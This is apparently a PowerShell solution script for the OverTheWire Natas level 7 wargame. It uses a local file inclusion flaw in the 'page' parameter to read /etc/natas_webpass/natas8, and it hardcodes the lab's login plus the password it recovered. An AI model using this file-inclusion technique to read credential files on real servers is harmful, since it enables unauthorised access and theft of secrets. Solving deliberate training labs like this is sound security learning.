
<#
Script to retrieve the password of level 6-7

#>
$url = "http://natas7.natas.labs.overthewire.org"
$creds = "natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

$a = (Invoke-WebRequest -uri $url -Method Get -Headers $headers).content


# $a.content
<#
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

We also see this. Good indication of lfi
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>


#>
$passwd_file =$a.split("--")[3].split(" ")[8]
$url = $url + "/index.php?page=" +  $passwd_file
$url 

#$url => http://natas7.natas.labs.overthewire.orgindex.php?page=/etc/natas_webpass/natas8 

$matches_longs = (Invoke-WebRequest -uri $url -Method Get -Headers $headers).content | select-string -AllMatches "(\w{20,})"

$passwd = $matches_longs.matches[1].value #Extracting passwd

echo "The password for level 8 is $passwd"


<#
PS /home/voltron/OTW/natas/pshell_lang> ./natas8.ps1                                                                
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8                                   
The password for level 8 is DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe                                                        
PS /home/voltron/OTW/natas/pshell_lang>  
#>